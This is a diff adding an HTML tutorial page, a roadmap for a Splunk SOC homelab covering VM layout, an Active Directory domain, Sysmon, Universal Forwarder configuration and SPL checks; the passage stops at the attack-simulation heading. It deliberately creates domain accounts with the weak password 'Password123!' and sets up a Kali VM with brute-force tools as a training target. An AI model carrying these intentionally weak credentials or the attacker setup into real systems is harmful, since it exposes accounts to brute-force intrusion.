@@ -1,0 +1,1227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SOC Homelab — Splunk SIEM Roadmap</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg: #0a0c10;
+  --surface: #111318;
+  --card: #161920;
+  --border: rgba(255,255,255,0.07);
+  --border-bright: rgba(255,255,255,0.15);
+  --text: #e8eaf0;
+  --muted: #7a7f8e;
+  --accent: #00d4aa;
+  --accent2: #3b82f6;
+  --accent3: #f59e0b;
+  --accent4: #ef4444;
+  --accent5: #a855f7;
+  --mono: 'JetBrains Mono', monospace;
+  --sans: 'Syne', sans-serif;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--bg);color:var(--text);font-family:var(--sans);line-height:1.6;min-height:100vh}
+a{color:var(--accent);text-decoration:none}
+
+/* Header */
+.hero{padding:60px 40px 40px;max-width:1100px;margin:0 auto;position:relative}
+.hero-label{font-family:var(--mono);font-size:11px;color:var(--accent);letter-spacing:3px;text-transform:uppercase;margin-bottom:16px;opacity:.8}
+.hero h1{font-size:clamp(36px,5vw,64px);font-weight:800;letter-spacing:-1px;line-height:1.05;color:#fff;margin-bottom:16px}
+.hero h1 span{color:var(--accent)}
+.hero p{font-size:16px;color:var(--muted);max-width:600px;line-height:1.7}
+.hero-badges{display:flex;flex-wrap:wrap;gap:8px;margin-top:24px}
+.badge{font-family:var(--mono);font-size:11px;padding:5px 12px;border-radius:4px;border:1px solid var(--border-bright);color:var(--muted);background:var(--surface)}
+.badge.green{border-color:rgba(0,212,170,.3);color:var(--accent);background:rgba(0,212,170,.05)}
+.badge.blue{border-color:rgba(59,130,246,.3);color:var(--accent2);background:rgba(59,130,246,.05)}
+.badge.amber{border-color:rgba(245,158,11,.3);color:var(--accent3);background:rgba(245,158,11,.05)}
+
+/* Architecture diagram */
+.arch-section{padding:0 40px 40px;max-width:1100px;margin:0 auto}
+.section-title{font-family:var(--mono);font-size:11px;color:var(--muted);letter-spacing:3px;text-transform:uppercase;margin-bottom:20px;padding-bottom:8px;border-bottom:1px solid var(--border)}
+.arch-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:12px;margin-bottom:12px}
+.arch-vm{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:16px 14px;text-align:center;position:relative;transition:border-color .2s}
+.arch-vm:hover{border-color:var(--border-bright)}
+.arch-vm .vm-icon{font-size:28px;margin-bottom:8px}
+.arch-vm .vm-name{font-size:13px;font-weight:700;color:#fff;margin-bottom:4px}
+.arch-vm .vm-os{font-family:var(--mono);font-size:10px;color:var(--muted)}
+.arch-vm .vm-ip{font-family:var(--mono);font-size:10px;color:var(--accent);margin-top:6px}
+.arch-vm .vm-role{font-size:11px;color:var(--muted);margin-top:4px;line-height:1.3}
+.vm-splunk{border-color:rgba(0,212,170,.3);background:rgba(0,212,170,.03)}
+.vm-kali{border-color:rgba(239,68,68,.3);background:rgba(239,68,68,.03)}
+.vm-win{border-color:rgba(59,130,246,.3);background:rgba(59,130,246,.03)}
+.vm-ubuntu{border-color:rgba(245,158,11,.3);background:rgba(245,158,11,.03)}
+.vm-winserver{border-color:rgba(168,85,247,.3);background:rgba(168,85,247,.03)}
+
+/* Phases */
+.phases{padding:0 40px 60px;max-width:1100px;margin:0 auto}
+.phase{margin-bottom:48px;position:relative}
+.phase-header{display:flex;align-items:flex-start;gap:20px;margin-bottom:20px;cursor:pointer;user-select:none}
+.phase-num{font-family:var(--mono);font-size:48px;font-weight:700;color:var(--border-bright);line-height:1;flex-shrink:0;width:70px}
+.phase-meta{}
+.phase-tag{font-family:var(--mono);font-size:10px;letter-spacing:2px;text-transform:uppercase;margin-bottom:4px}
+.phase-title{font-size:22px;font-weight:700;color:#fff;line-height:1.2;margin-bottom:6px}
+.phase-desc{font-size:14px;color:var(--muted);max-width:700px}
+.phase-time{font-family:var(--mono);font-size:11px;margin-top:8px;padding:3px 10px;border-radius:4px;display:inline-block;border:1px solid var(--border)}
+
+/* Steps inside a phase */
+.steps{display:flex;flex-direction:column;gap:12px;margin-left:90px}
+.step{background:var(--card);border:1px solid var(--border);border-radius:12px;overflow:hidden}
+.step-header{display:flex;align-items:center;gap:14px;padding:16px 20px;cursor:pointer}
+.step-num{font-family:var(--mono);font-size:11px;color:var(--muted);flex-shrink:0;width:28px}
+.step-title{font-size:14px;font-weight:600;color:#fff;flex:1}
+.step-arrow{font-size:12px;color:var(--muted);transition:transform .2s;flex-shrink:0}
+.step.open .step-arrow{transform:rotate(180deg)}
+.step-body{padding:0 20px 0 62px;max-height:0;overflow:hidden;transition:max-height .3s ease,padding .3s ease}
+.step.open .step-body{padding:0 20px 20px 62px;max-height:2000px}
+
+/* Step content */
+.step-section{margin-top:14px}
+.step-section h4{font-family:var(--mono);font-size:10px;letter-spacing:2px;text-transform:uppercase;color:var(--muted);margin-bottom:8px}
+.code-block{background:#0d0f14;border:1px solid var(--border);border-radius:8px;padding:14px 16px;font-family:var(--mono);font-size:12px;color:#a8b3cf;line-height:1.7;overflow-x:auto}
+.code-block .cmd{color:#00d4aa}
+.code-block .cmt{color:#4a5568}
+.code-block .kw{color:#f59e0b}
+.code-block .str{color:#a3e635}
+.bullets{list-style:none;display:flex;flex-direction:column;gap:6px}
+.bullets li{font-size:13px;color:var(--muted);padding-left:16px;position:relative;line-height:1.5}
+.bullets li::before{content:"→";position:absolute;left:0;color:var(--accent);font-size:11px;top:1px}
+.bullets li strong{color:var(--text)}
+.note{background:rgba(245,158,11,.05);border:1px solid rgba(245,158,11,.2);border-radius:8px;padding:10px 14px;font-size:12px;color:#d4a843;margin-top:10px;font-family:var(--mono)}
+.info{background:rgba(59,130,246,.05);border:1px solid rgba(59,130,246,.2);border-radius:8px;padding:10px 14px;font-size:12px;color:#7bafd4;margin-top:10px;font-family:var(--mono)}
+.danger{background:rgba(239,68,68,.05);border:1px solid rgba(239,68,68,.2);border-radius:8px;padding:10px 14px;font-size:12px;color:#f87171;margin-top:10px;font-family:var(--mono)}
+.two-col{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:10px}
+@media(max-width:640px){.two-col{grid-template-columns:1fr}.steps{margin-left:0}.hero{padding:40px 20px 30px}.arch-section,.phases{padding-left:20px;padding-right:20px}}
+
+/* SPL queries */
+.spl{background:#060810;border:1px solid rgba(59,130,246,.2);border-radius:8px;padding:14px 16px;font-family:var(--mono);font-size:12px;color:#93c5fd;line-height:1.8;overflow-x:auto;margin-top:8px}
+.spl .pipe{color:#f59e0b}
+.spl .val{color:#a3e635}
+
+/* Progress dots */
+.phase-dots{display:flex;gap:6px;margin-bottom:32px;flex-wrap:wrap;padding-left:90px}
+.dot{width:8px;height:8px;border-radius:50%;background:var(--border-bright)}
+
+/* Divider */
+.divider{height:1px;background:var(--border);margin:0 40px 48px;max-width:1100px;margin-left:auto;margin-right:auto}
+
+/* Sticky nav */
+.phase-color-1{--pc:var(--accent)}
+.phase-color-2{--pc:var(--accent2)}
+.phase-color-3{--pc:var(--accent3)}
+.phase-color-4{--pc:var(--accent4)}
+.phase-color-5{--pc:var(--accent5)}
+.phase-color-6{--pc:#06b6d4}
+.phase-tag{color:var(--pc);border-left:3px solid var(--pc);padding-left:10px}
+.phase-num{color:color-mix(in srgb,var(--pc) 30%,transparent)}
+</style>
+</head>
+<body>
+
+<div class="hero">
+  <div class="hero-label">Complete Learning Roadmap</div>
+  <h1>SOC Homelab<br><span>Splunk SIEM</span></h1>
+  <p>A structured, phase-by-phase guide to building a production-grade Security Operations Center homelab — from virtualization to threat hunting and detection engineering.</p>
+  <div class="hero-badges">
+    <span class="badge green">6 Phases</span>
+    <span class="badge blue">Splunk Enterprise</span>
+    <span class="badge">Active Directory</span>
+    <span class="badge">Sysmon</span>
+    <span class="badge amber">MITRE ATT&CK</span>
+    <span class="badge">Atomic Red Team</span>
+    <span class="badge">Kali Linux</span>
+  </div>
+</div>
+
+<!-- Architecture Overview -->
+<div class="arch-section">
+  <div class="section-title">Lab Architecture — Virtual Machine Layout</div>
+  <div class="arch-grid">
+    <div class="arch-vm vm-splunk">
+      <div class="vm-icon">🖥️</div>
+      <div class="vm-name">Splunk Server</div>
+      <div class="vm-os">Ubuntu 22.04 LTS</div>
+      <div class="vm-ip">192.168.10.10</div>
+      <div class="vm-role">SIEM · Log Indexer · Web UI</div>
+    </div>
+    <div class="arch-vm vm-winserver">
+      <div class="vm-icon">🗄️</div>
+      <div class="vm-name">Domain Controller</div>
+      <div class="vm-os">Windows Server 2022</div>
+      <div class="vm-ip">192.168.10.20</div>
+      <div class="vm-role">Active Directory · DNS · Log Source</div>
+    </div>
+    <div class="arch-vm vm-win">
+      <div class="vm-icon">💻</div>
+      <div class="vm-name">Windows Client</div>
+      <div class="vm-os">Windows 10/11</div>
+      <div class="vm-ip">192.168.10.30</div>
+      <div class="vm-role">Target Machine · Sysmon · Forwarder</div>
+    </div>
+    <div class="arch-vm vm-ubuntu">
+      <div class="vm-icon">🐧</div>
+      <div class="vm-name">Ubuntu Desktop</div>
+      <div class="vm-os">Ubuntu 22.04</div>
+      <div class="vm-ip">192.168.10.40</div>
+      <div class="vm-role">Linux Target · rsyslog · Forwarder</div>
+    </div>
+    <div class="arch-vm vm-kali">
+      <div class="vm-icon">⚔️</div>
+      <div class="vm-name">Kali Linux</div>
+      <div class="vm-os">Kali Rolling 2024+</div>
+      <div class="vm-ip">192.168.10.50</div>
+      <div class="vm-role">Attacker · Hydra · Metasploit</div>
+    </div>
+  </div>
+  <div class="info">💡 All VMs run on the same internal NAT network (192.168.10.0/24) using VirtualBox or VMware Workstation. This keeps attack traffic isolated from your real network.</div>
+</div>
+
+<div class="divider"></div>
+
+<!-- All Phases -->
+<div class="phases">
+
+<!-- PHASE 1 -->
+<div class="phase phase-color-1">
+  <div class="phase-header">
+    <div class="phase-num">01</div>
+    <div class="phase-meta">
+      <div class="phase-tag">Foundation</div>
+      <div class="phase-title">Prerequisites & Host Setup</div>
+      <div class="phase-desc">Prepare your host machine and understand the hardware you need before building anything.</div>
+      <div class="phase-time">⏱ Week 1 · Estimated 2–3 days</div>
+    </div>
+  </div>
+  <div class="steps">
+
+    <div class="step open">
+      <div class="step-header" onclick="toggle(this)">
+        <span class="step-num">1.1</span>
+        <span class="step-title">Hardware Requirements & Planning</span>
+        <span class="step-arrow">▾</span>
+      </div>
+      <div class="step-body">
+        <div class="step-section">
+          <h4>Minimum Host Specs</h4>
+          <ul class="bullets">
+            <li><strong>RAM:</strong> 16 GB minimum — 32 GB strongly recommended (5 VMs running simultaneously)</li>
+            <li><strong>CPU:</strong> Modern quad-core with VT-x/AMD-V virtualization enabled in BIOS</li>
+            <li><strong>Storage:</strong> 250 GB free SSD space — spinning disks will make the lab painfully slow</li>
+            <li><strong>Network:</strong> Single NIC is fine — all traffic stays in virtual networks</li>
+          </ul>
+        </div>
+        <div class="step-section">
+          <h4>VM Resource Allocation Plan</h4>
+          <div class="two-col">
+            <div class="code-block">
+<span class="cmt"># Splunk Server (Ubuntu)</span>
+RAM: <span class="kw">4–8 GB</span>
+CPU: <span class="kw">2–4 cores</span>
+Disk: <span class="kw">60 GB</span>
+<span class="cmt"># Windows Server 2022 (DC)</span>
+RAM: <span class="kw">2–4 GB</span>
+CPU: <span class="kw">2 cores</span>
+Disk: <span class="kw">50 GB</span>
+            </div>
+            <div class="code-block">
+<span class="cmt"># Windows 10/11 (Target)</span>
+RAM: <span class="kw">2–4 GB</span>
+CPU: <span class="kw">2 cores</span>
+Disk: <span class="kw">50 GB</span>
+<span class="cmt"># Kali Linux (Attacker)</span>
+RAM: <span class="kw">2–4 GB</span>
+CPU: <span class="kw">2 cores</span>
+Disk: <span class="kw">30–40 GB</span>
+            </div>
+          </div>
+        </div>
+        <div class="note">⚠ Splunk needs RAM most. Give it as much as you can spare — it processes high log volumes and slow RAM causes indexing delays.</div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header" onclick="toggle(this)">
+        <span class="step-num">1.2</span>
+        <span class="step-title">Install Hypervisor (VirtualBox or VMware)</span>
+        <span class="step-arrow">▾</span>
+      </div>
+      <div class="step-body">
+        <div class="step-section">
+          <h4>Option A — VirtualBox (Free)</h4>
+          <div class="code-block">
+<span class="cmt"># Download from virtualbox.org</span>
+<span class="cmd">sudo apt install virtualbox virtualbox-ext-pack</span>
+<span class="cmt"># Enable VT-x/AMD-V in BIOS first!</span>
+          </div>
+        </div>
+        <div class="step-section">
+          <h4>Option B — VMware Workstation Pro (Free since 2024)</h4>
+          <div class="code-block">
+<span class="cmt"># Download VMware Workstation Pro free from broadcom.com</span>
+<span class="cmt"># Better performance for Windows VMs</span>
+<span class="cmt"># Recommended if your host is Windows</span>
+          </div>
+        </div>
+        <div class="step-section">
+          <h4>Create Internal NAT Network</h4>
+          <div class="code-block">
+<span class="cmt"># VirtualBox: File → Tools → Network Manager</span>
+<span class="cmt"># Create NAT Network: 192.168.10.0/24</span>
+<span class="cmt"># Name it: SOC-Lab-Network</span>
+<span class="cmt"># Enable DHCP (you'll assign static IPs manually per VM)</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header" onclick="toggle(this)">
+        <span class="step-num">1.3</span>
+        <span class="step-title">Download All Required ISOs & Software</span>
+        <span class="step-arrow">▾</span>
+      </div>
+      <div class="step-body">
+        <ul class="bullets">
+          <li><strong>Ubuntu 22.04 LTS Server</strong> — ubuntu.com/download/server</li>
+          <li><strong>Windows Server 2022 Evaluation</strong> — microsoft.com (180-day free trial)</li>
+          <li><strong>Windows 10/11</strong> — microsoft.com/software-download</li>
+          <li><strong>Kali Linux</strong> — kali.org/get-kali (pre-built VM image saves time)</li>
+          <li><strong>Splunk Enterprise</strong> — splunk.com/en_us/download/splunk-enterprise.html (free 60-day, then 500MB/day free forever)</li>
+          <li><strong>Splunk Universal Forwarder</strong> — splunk.com/en_us/download/universal-forwarder.html</li>
+          <li><strong>Sysmon</strong> — learn.microsoft.com/en-us/sysinternals/downloads/sysmon</li>
+        </ul>
+        <div class="info">💡 The Splunk free license after 60 days limits ingestion to 500 MB/day — perfectly sufficient for a homelab generating typical security telemetry.</div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- PHASE 2 -->
+<div class="phase phase-color-2">
+  <div class="phase-header">
+    <div class="phase-num">02</div>
+    <div class="phase-meta">
+      <div class="phase-tag">Infrastructure</div>
+      <div class="phase-title">VM Deployment & Network Setup</div>
+      <div class="phase-desc">Spin up all virtual machines, assign IPs, and configure the domain environment.</div>
+      <div class="phase-time">⏱ Week 1–2 · Estimated 3–5 days</div>
+    </div>
+  </div>
+  <div class="steps">
+
+    <div class="step">
+      <div class="step-header" onclick="toggle(this)">
+        <span class="step-num">2.1</span>
+        <span class="step-title">Deploy Ubuntu Splunk Server VM</span>
+        <span class="step-arrow">▾</span>
+      </div>
+      <div class="step-body">
+        <div class="step-section">
+          <h4>VM Settings</h4>
+          <div class="code-block">
+RAM: <span class="kw">4–8 GB</span> | CPU: <span class="kw">2–4 cores</span> | Disk: <span class="kw">60 GB</span>
+Network Adapter: <span class="kw">SOC-Lab-Network</span> (NAT Network)
+          </div>
+        </div>
+        <div class="step-section">
+          <h4>Post-Install — Assign Static IP</h4>
+          <div class="code-block">
+<span class="cmt"># Edit netplan config</span>
+<span class="cmd">sudo nano /etc/netplan/00-installer-config.yaml</span>
+
+<span class="cmt"># Add:</span>
+network:
+  version: <span class="kw">2</span>
+  ethernets:
+    enp0s3:
+      dhcp4: <span class="kw">no</span>
+      addresses: [<span class="str">192.168.10.10/24</span>]
+      gateway4: <span class="str">192.168.10.1</span>
+      nameservers:
+        addresses: [<span class="str">8.8.8.8</span>, <span class="str">8.8.4.4</span>]
+
+<span class="cmd">sudo netplan apply</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header" onclick="toggle(this)">
+        <span class="step-num">2.2</span>
+        <span class="step-title">Deploy Windows Server 2022 — Active Directory DC</span>
+        <span class="step-arrow">▾</span>
+      </div>
+      <div class="step-body">
+        <div class="step-section">
+          <h4>Active Directory Setup Steps</h4>
+          <ul class="bullets">
+            <li>Install Windows Server 2022, set static IP: <strong>192.168.10.20</strong></li>
+            <li>Open Server Manager → Add Roles → <strong>Active Directory Domain Services</strong></li>
+            <li>Promote to Domain Controller — create new forest (e.g., <strong>soc.local</strong>)</li>
+            <li>Set DSRM password, complete promotion and reboot</li>
+            <li>Create <strong>Organizational Units</strong>: IT, HR, Finance, Admin</li>
+            <li>Create <strong>test user accounts</strong> in each OU (e.g., jsmith, tuser, badactor)</li>
+          </ul>
+          <div class="code-block">
+<span class="cmt"># PowerShell — Create test users for attack simulation</span>
+<span class="cmd">New-ADUser</span> -Name <span class="str">"John Smith"</span> -SamAccountName <span class="str">"jsmith"</span> `
+  -AccountPassword (<span class="str">"Password123!"</span> | ConvertTo-SecureString -AsPlainText -Force) `
+  -Enabled <span class="kw">$true</span> -Path <span class="str">"OU=IT,DC=soc,DC=local"</span>
+          </div>
+        </div>
+        <div class="note">⚠ Use weak passwords like "Password123!" intentionally — these are targets for your brute-force simulations. Never reuse these anywhere real.</div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header" onclick="toggle(this)">
+        <span class="step-num">2.3</span>
+        <span class="step-title">Deploy Windows 10/11 Client & Join Domain</span>
+        <span class="step-arrow">▾</span>
+      </div>
+      <div class="step-body">
+        <div class="step-section">
+          <h4>Domain Join Steps</h4>
+          <ul class="bullets">
+            <li>Set static IP <strong>192.168.10.30</strong>, DNS pointing to DC: <strong>192.168.10.20</strong></li>
+            <li>System → Advanced → Computer Name → Change → Domain: <strong>soc.local</strong></li>
+            <li>Authenticate with domain admin credentials, reboot</li>
+            <li>Log in with domain user (e.g., <strong>soc\jsmith</strong>)</li>
+          </ul>
+        </div>
+        <div class="step-section">
+          <h4>Enable Advanced Audit Policies via GPO</h4>
+          <div class="code-block">
+<span class="cmt"># On Domain Controller — Group Policy Management</span>
+<span class="cmt"># Default Domain Policy → Computer Config → Policies</span>
+<span class="cmt"># → Windows Settings → Security Settings → Advanced Audit</span>
+
+Logon/Logoff:     <span class="kw">Audit Logon — Success + Failure</span>
+Account Logon:    <span class="kw">Audit Credential Validation — Success + Failure</span>
+Object Access:    <span class="kw">Audit File System — Success + Failure</span>
+Process Tracking: <span class="kw">Audit Process Creation — Success</span>
+Privilege Use:    <span class="kw">Audit Sensitive Privilege Use — Success + Failure</span>
+Account Mgmt:     <span class="kw">Audit User Account Management — Success + Failure</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header" onclick="toggle(this)">
+        <span class="step-num">2.4</span>
+        <span class="step-title">Deploy Kali Linux (Attacker Machine)</span>
+        <span class="step-arrow">▾</span>
+      </div>
+      <div class="step-body">
+        <ul class="bullets">
+          <li>Import pre-built Kali OVA or install from ISO — static IP <strong>192.168.10.50</strong></li>
+          <li>Update: <strong>sudo apt update && sudo apt upgrade -y</strong></li>
+          <li>Verify tools: <strong>hydra, nmap, metasploit, netcat</strong> are all pre-installed</li>
+          <li>Install Crowbar: <strong>sudo apt install crowbar</strong> (alternative brute-force tool)</li>
+        </ul>
+        <div class="danger">🔴 Keep Kali on the isolated NAT network ONLY. Never bridge it to your real home network. All attack tools must stay in the lab.</div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- PHASE 3 -->
+<div class="phase phase-color-3">
+  <div class="phase-header">
+    <div class="phase-num">03</div>
+    <div class="phase-meta">
+      <div class="phase-tag">SIEM Core</div>
+      <div class="phase-title">Splunk Installation & Log Ingestion</div>
+      <div class="phase-desc">Install Splunk Enterprise, configure log forwarding from all endpoints, and validate data flow.</div>
+      <div class="phase-time">⏱ Week 2–3 · Estimated 3–4 days</div>
+    </div>
+  </div>
+  <div class="steps">
+
+    <div class="step">
+      <div class="step-header" onclick="toggle(this)">
+        <span class="step-num">3.1</span>
+        <span class="step-title">Install Splunk Enterprise on Ubuntu</span>
+        <span class="step-arrow">▾</span>
+      </div>
+      <div class="step-body">
+        <div class="step-section">
+          <h4>Installation Commands</h4>
+          <div class="code-block">
+<span class="cmt"># Download Splunk Enterprise .deb package</span>
+<span class="cmd">wget -O splunk.deb</span> <span class="str">https://download.splunk.com/products/splunk/releases/9.3.0/linux/splunk-9.3.0-linux-amd64.deb</span>
+
+<span class="cmt"># Install the package</span>
+<span class="cmd">sudo dpkg -i splunk.deb</span>
+
+<span class="cmt"># Move to Splunk bin directory and enable on boot</span>
+<span class="cmd">cd /opt/splunk/bin</span>
+<span class="cmd">sudo ./splunk enable boot-start --accept-license</span>
+<span class="cmt"># Set admin username + password when prompted</span>
+
+<span class="cmt"># Start Splunk</span>
+<span class="cmd">sudo ./splunk start</span>
+
+<span class="cmt"># Allow port 8000 through firewall (Web UI)</span>
+<span class="cmd">sudo ufw allow 8000/tcp</span>
+<span class="cmt"># Allow port 9997 (forwarder receiving)</span>
+<span class="cmd">sudo ufw allow 9997/tcp</span>
+          </div>
+        </div>
+        <div class="step-section">
+          <h4>Access Web UI</h4>
+          <div class="code-block">
+URL: <span class="str">http://192.168.10.10:8000</span>
+Login: <span class="kw">admin</span> / <span class="kw">[your password]</span>
+          </div>
+        </div>
+        <div class="step-section">
+          <h4>Configure Receiving Port (for Universal Forwarders)</h4>
+          <div class="code-block">
+<span class="cmt"># Settings → Forwarding and Receiving → Configure Receiving</span>
+<span class="cmt"># Click "New Receiving Port" → Add port: 9997</span>
+<span class="cmt"># Or via CLI:</span>
+<span class="cmd">sudo ./splunk enable listen 9997 -auth admin:yourpassword</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header" onclick="toggle(this)">
+        <span class="step-num">3.2</span>
+        <span class="step-title">Install Sysmon on Windows Machines</span>
+        <span class="step-arrow">▾</span>
+      </div>
+      <div class="step-body">
+        <div class="step-section">
+          <h4>What is Sysmon?</h4>
+          <ul class="bullets">
+            <li><strong>System Monitor</strong> — a Windows service that logs granular events: process creation, network connections, file changes, registry modifications, driver loads</li>
+            <li>Standard Windows Event Log misses most attack telemetry — Sysmon fills that gap</li>
+            <li>Use <strong>SwiftOnSecurity config</strong> or <strong>Olaf Hartong's modular config</strong> for MITRE ATT&CK alignment</li>
+          </ul>
+        </div>
+        <div class="step-section">
+          <h4>Installation (PowerShell — run as Administrator)</h4>
+          <div class="code-block">
+<span class="cmt"># Download Sysmon and the SwiftOnSecurity config</span>
+<span class="cmt"># Place both in C:\Sysmon\</span>
+
+<span class="cmt"># Download SwiftOnSecurity config:</span>
+<span class="cmt"># https://github.com/SwiftOnSecurity/sysmon-config</span>
+
+<span class="cmt"># Install with config</span>
+<span class="cmd">.\Sysmon64.exe -accepteula -i sysmonconfig-export.xml -n</span>
+
+<span class="cmt"># Verify it's running</span>
+<span class="cmd">Get-Service Sysmon64</span>
+
+<span class="cmt"># View logs in Event Viewer:</span>
+<span class="cmt"># Applications and Services → Microsoft → Windows → Sysmon → Operational</span>
+          </div>
+        </div>
+        <div class="step-section">
+          <h4>Key Sysmon Event IDs to Know</h4>
+          <ul class="bullets">
+            <li><strong>Event ID 1</strong> — Process Create (command line, hashes, parent process)</li>
+            <li><strong>Event ID 3</strong> — Network Connection (source/dest IP, port, process)</li>
+            <li><strong>Event ID 7</strong> — Image Loaded (DLL loaded into process)</li>
+            <li><strong>Event ID 10</strong> — Process Access (credential dumping indicator)</li>
+            <li><strong>Event ID 11</strong> — File Created</li>
+            <li><strong>Event ID 13</strong> — Registry Value Set</li>
+            <li><strong>Event ID 22</strong> — DNS Query</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header" onclick="toggle(this)">
+        <span class="step-num">3.3</span>
+        <span class="step-title">Install Splunk Universal Forwarder on Windows</span>
+        <span class="step-arrow">▾</span>
+      </div>
+      <div class="step-body">
+        <div class="step-section">
+          <h4>Install Universal Forwarder</h4>
+          <div class="code-block">
+<span class="cmt"># Run the MSI installer on Windows 10/11 and Server 2022</span>
+<span class="cmt"># During install wizard:</span>
+Receiving Indexer: <span class="str">192.168.10.10:9997</span>
+<span class="cmt"># Set local admin credentials for the forwarder service</span>
+          </div>
+        </div>
+        <div class="step-section">
+          <h4>Create inputs.conf to Forward Sysmon + Security Logs</h4>
+          <div class="code-block">
+<span class="cmt"># File: C:\Program Files\SplunkUniversalForwarder\etc\system\local\inputs.conf</span>
+
+[WinEventLog://Security]
+disabled = <span class="kw">0</span>
+index = <span class="str">endpoint</span>
+renderXml = <span class="kw">true</span>
+
+[WinEventLog://Microsoft-Windows-Sysmon/Operational]
+disabled = <span class="kw">0</span>
+index = <span class="str">endpoint</span>
+renderXml = <span class="kw">true</span>
+sourcetype = <span class="str">XmlWinEventLog:Microsoft-Windows-Sysmon/Operational</span>
+
+[WinEventLog://System]
+disabled = <span class="kw">0</span>
+index = <span class="str">endpoint</span>
+
+[WinEventLog://Application]
+disabled = <span class="kw">0</span>
+index = <span class="str">endpoint</span>
+          </div>
+        </div>
+        <div class="step-section">
+          <h4>Create outputs.conf to Point at Splunk</h4>
+          <div class="code-block">
+<span class="cmt"># File: ...\SplunkUniversalForwarder\etc\system\local\outputs.conf</span>
+
+[tcpout]
+defaultGroup = <span class="str">splunk_indexer</span>
+
+[tcpout:splunk_indexer]
+server = <span class="str">192.168.10.10:9997</span>
+          </div>
+        </div>
+        <div class="step-section">
+          <h4>Restart Forwarder & Create Index in Splunk</h4>
+          <div class="code-block">
+<span class="cmt"># PowerShell (restart forwarder)</span>
+<span class="cmd">Restart-Service SplunkForwarder</span>
+
+<span class="cmt"># In Splunk Web UI:</span>
+<span class="cmt"># Settings → Indexes → New Index → Name: endpoint</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header" onclick="toggle(this)">
+        <span class="step-num">3.4</span>
+        <span class="step-title">Configure Linux Log Forwarding (Ubuntu)</span>
+        <span class="step-arrow">▾</span>
+      </div>
+      <div class="step-body">
+        <div class="step-section">
+          <h4>Option A — Splunk Universal Forwarder (Recommended)</h4>
+          <div class="code-block">
+<span class="cmt"># Download Linux forwarder .deb</span>
+<span class="cmd">wget -O splunkforwarder.deb https://download.splunk.com/products/universalforwarder/releases/9.3.0/linux/splunkforwarder-9.3.0-linux-amd64.deb</span>
+<span class="cmd">sudo dpkg -i splunkforwarder.deb</span>
+<span class="cmd">cd /opt/splunkforwarder/bin</span>
+<span class="cmd">sudo ./splunk start --accept-license</span>
+<span class="cmd">sudo ./splunk add forward-server 192.168.10.10:9997</span>
+<span class="cmd">sudo ./splunk add monitor /var/log/auth.log -index linux_logs</span>
+<span class="cmd">sudo ./splunk add monitor /var/log/syslog -index linux_logs</span>
+          </div>
+        </div>
+        <div class="step-section">
+          <h4>Option B — rsyslog to Splunk UDP/TCP</h4>
+          <div class="code-block">
+<span class="cmt"># /etc/rsyslog.conf — add at bottom:</span>
+<span class="kw">*.* @@192.168.10.10:514</span>  <span class="cmt"># TCP (@@) or UDP (@)</span>
+<span class="cmd">sudo systemctl restart rsyslog</span>
+<span class="cmt"># Configure Splunk to listen on 514</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header" onclick="toggle(this)">
+        <span class="step-num">3.5</span>
+        <span class="step-title">Install Essential Splunk Apps</span>
+        <span class="step-arrow">▾</span>
+      </div>
+      <div class="step-body">
+        <ul class="bullets">
+          <li><strong>Splunk Add-on for Microsoft Sysmon</strong> — normalizes Sysmon XML logs into CIM-compliant fields. Install via Apps → Find More Apps → search "Sysmon"</li>
+          <li><strong>Splunk Add-on for Microsoft Windows</strong> — Windows Event Log field extraction</li>
+          <li><strong>Splunk Security Essentials (SSE)</strong> — free detection content mapped to MITRE ATT&CK. Hundreds of pre-built use cases</li>
+          <li><strong>Palo Alto Networks Add-on</strong> — if you add pfSense/firewall logs later</li>
+          <li><strong>ES Content Updates</strong> — free detection rules from Splunk's security research team (research.splunk.com)</li>
+        </ul>
+        <div class="info">💡 After installing apps, restart Splunk: sudo /opt/splunk/bin/splunk restart</div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header" onclick="toggle(this)">
+        <span class="step-num">3.6</span>
+        <span class="step-title">Validate Data Ingestion</span>
+        <span class="step-arrow">▾</span>
+      </div>
+      <div class="step-body">
+        <div class="step-section">
+          <h4>Run These SPL Searches to Confirm Everything Is Flowing</h4>
+          <div class="spl">
+<span class="cmt"># See all data sources reporting in last 24 hours</span>
+index=endpoint <span class="pipe">| stats</span> count by source, host, sourcetype
+          </div>
+          <div class="spl">
+<span class="cmt"># Confirm Sysmon logs arriving</span>
+index=endpoint sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational
+<span class="pipe">| stats</span> count by EventCode, host
+<span class="pipe">| sort</span> -count
+          </div>
+          <div class="spl">
+<span class="cmt"># Confirm Windows Security events arriving</span>
+index=endpoint source=WinEventLog:Security
+<span class="pipe">| stats</span> count by EventCode
+<span class="pipe">| sort</span> -count
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- PHASE 4 -->
+<div class="phase phase-color-4">
+  <div class="phase-header">
+    <div class="phase-num">04</div>
+    <div class="phase-meta">
+      <div class="phase-tag">Attack Simulation</div>
+      <div class="phase-title">Simulating Real Attacks</div>
